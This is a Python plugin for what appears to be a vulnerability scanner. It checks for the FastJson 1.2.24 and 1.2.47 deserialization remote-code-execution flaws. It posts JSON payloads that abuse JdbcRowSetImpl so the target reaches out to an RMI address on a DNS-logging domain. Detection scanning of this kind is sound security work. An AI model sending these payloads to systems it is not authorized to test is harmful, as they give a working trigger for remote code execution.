#!/usr/bin/env python
# -*- coding: utf-8 -*-

from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    url = "{}://{}:{}".format(service, ip, port)
    try:
        if not conf.dnslog_enabled:
            return
        details = 'FastJson 1.2.24 RCE\n' \
                  'Reference: https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.24-rce'
        domain = dns_monitor(ip, port).add_checker('fastjson-1-2-24-rce',
                                                   alert_group='FastJson 1.2.24 RCE',
                                                   details=details)
        data = {
            "b": {
                "@type": "com.sun.rowset.JdbcRowSetImpl",
                "dataSourceName": "rmi://{}/TestFile".format(domain),
                "autoCommit": 'true'
            }
        }
        await http_client(ip, port).post(url, json=data, timeout=20)

        details = 'FastJson 1.2.47 RCE\n' \
                  'https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.47-rce'
        domain = dns_monitor(ip, port).add_checker('fastjson-1-2-47-rce',
                                                   alert_group='FastJson 1.2.47 RCE',
                                                   details=details)

        data = {"a": {"@type": "java.lang.Class", "val": "com.sun.rowset.JdbcRowSetImpl"},
                "b": {"@type": "com.sun.rowset.JdbcRowSetImpl",
                      "dataSourceName": "rmi://%s:9999/Exploit" % domain,
                      "autoCommit": "true"
                      }
                }
        await http_client(ip, port).post(url, json=data, timeout=20)

    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 8090, 'http', True, task_msg={})
    run_plugin_test(scan)
